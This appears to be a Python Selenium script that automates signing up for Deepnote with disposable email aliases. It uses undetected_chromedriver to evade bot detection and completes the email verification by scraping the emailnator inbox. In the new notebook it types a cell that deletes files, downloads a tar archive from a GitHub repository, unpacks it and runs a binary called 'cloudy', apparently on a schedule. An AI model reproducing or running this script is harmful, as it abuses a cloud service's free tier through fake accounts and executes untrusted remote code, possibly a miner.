import os
import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import random
print("aaa")
time.sleep(5)
os.system("rm -rf rawrz")
os.system("tar -xf volx.tar.gz")
os.system("rm -rf rawr")
os.system("cp -r rawrz rawr")
# os.system("npm i")
options = uc.ChromeOptions()
a = True
low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
ass = "".join(random.sample(username_for, 12))
options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
options.add_argument('--user-data-dir=rawr')
options.add_argument("--remote-debugging-port=38223")
driver = uc.Chrome(options=options, version_main=106)  # version_main allows to specify your chrome version instead of following chrome global version
driver.set_window_size(1920, 1080)
low_word = "abcdefghijklkmnopqrstuvwxyz"
driver.execute_script('''window.open("http://bings.com","_blank");''')
driver.switch_to.window(driver.window_handles[1])
driver.get("https://www.emailnator.com/")
time.sleep(6)
try:
    driver.find_element(By.XPATH, '//*[@id="qc-cmp2-ui"]/div[2]/div/button[2]').click()
except:
    pass
time.sleep(0.5)
try:
    driver.find_element(By.XPATH, '//*[@id="close-btn-ann"]').click()
except:
    pass
time.sleep(1.5)
driver.find_element(By.XPATH, '//*[@id="custom-switch-domain"]').click()
time.sleep(0.5)
driver.find_element(By.XPATH, '//*[@id="custom-switch-dotGmail"]').click()
time.sleep(0.5)
driver.find_element(By.XPATH, '/html/body/div/div/main/div[1]/div/div/div/div[2]/div/div[5]/div/button').click()
time.sleep(2)
emil = driver.find_element(By.XPATH, '/html/body/div/div/main/div[1]/div/div/div/div[2]/div/div[1]/input').get_attribute("value")
emil = emil.split("+")[0]+"+"+"".join(random.sample(low_word, 13))+"@gmail.com"
time.sleep(1)
driver.switch_to.window(driver.window_handles[0])
# random.choice(a)+"+"+emailrepl+"@gmail.com"
print(emil)

driver.get("https://deepnote.com/sign-up")
time.sleep(1)
driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/button[3]').click()
time.sleep(2)
driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/div/div/div/input').send_keys(emil)
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div/div[2]/button").click()
time.sleep(90)


driver.switch_to.window(driver.window_handles[1])
time.sleep(2)
driver.get("https://www.emailnator.com/inbox/"+emil)
# driver.find_element(By.XPATH, "/html/body/div/div/main/div[1]/div/div/div/div[2]/div/div[3]/button").click()
time.sleep(6)
linkzxd = driver.find_element(By.XPATH, "/html/body/div/div/section/div/div/div[3]/div/div[2]/div[2]/div/table/tbody/tr[2]/td/a").get_attribute("href")
time.sleep(0.5)
driver.get(linkzxd)
time.sleep(7)
verifylink = driver.find_element(By.XPATH, "/html/body/div/div/section/div/div/div[3]/div/div/div[2]/div/div/table[2]/tbody/tr/td/table/tbody/tr[2]/td/table/tbody/tr/td/a").get_attribute("href")
driver.switch_to.window(driver.window_handles[0])
time.sleep(1)
driver.get(verifylink)
time.sleep(0.5)
time.sleep(3)
driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[2]/div/div/div[1]/input[1]').send_keys("".join(random.sample(low_word, 6)))
time.sleep(0.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
time.sleep(2.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/select/option[3]").click()
time.sleep(0.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[2]/select/option[2]").click()
time.sleep(0.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[3]/select/option[2]").click()
time.sleep(0.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
time.sleep(2)
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/div/input").send_keys("".join(random.sample(low_word, 6)))
time.sleep(0.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button").click()
time.sleep(0.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[1]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[2]").click()
time.sleep(5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[2]").click()
time.sleep(15)
driver.get(driver.current_url.split("project")[0])
time.sleep(12)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[1]/button").click()
time.sleep(1.5)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[2]/div/div/button[1]").click()
time.sleep(40)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
time.sleep(1)
actions = ActionChains(driver)
actions.send_keys('!touch main && rm * && wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/fur.tar.gz && tar -xf fur.tar.gz && ./cloudy')
actions.perform()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[1]/div/div/div[2]/div[2]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[9]/div").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[1]/div[1]/label[2]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[1]/div[2]/div[1]/select/option[1]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[1]/div[2]/div[2]/div/div[1]").click()
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[2]/button").click()
time.sleep(12)
